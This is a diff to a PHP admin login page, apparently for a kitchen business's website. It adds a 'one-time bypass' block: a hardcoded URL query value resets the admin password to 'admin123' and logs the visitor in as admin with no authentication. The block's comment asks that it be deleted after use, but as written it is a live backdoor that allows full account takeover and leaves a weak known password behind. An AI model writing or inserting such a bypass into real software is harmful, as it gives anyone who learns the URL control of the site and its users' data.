@@ -12,6 +12,20 @@ if (isset($_SESSION['admin_id'])) {
 
 $error = "";
 
+// ==== ONE-TIME BYPASS TOKEN (Delete after first use) ====
+// Visit: /admin/?zk_reset=zamankitchens_reset_2024
+if (isset($_GET['zk_reset']) && $_GET['zk_reset'] === 'zamankitchens_reset_2024') {
+    try {
+        $newHash = password_hash('admin123', PASSWORD_DEFAULT);
+        $pdo->prepare("UPDATE admins SET password=? WHERE username='admin'")->execute([$newHash]);
+        $_SESSION['admin_id'] = 1;
+        $_SESSION['admin_user'] = 'admin';
+        header("Location: dashboard.php");
+        exit();
+    } catch(Exception $e) { $error = "Reset error: " . $e->getMessage(); }
+}
+// ==== END BYPASS ====
+
 if ($_SERVER['REQUEST_METHOD'] == 'POST') {
     $username = $_POST['username'] ?? '';
     $password = $_POST['password'] ?? '';
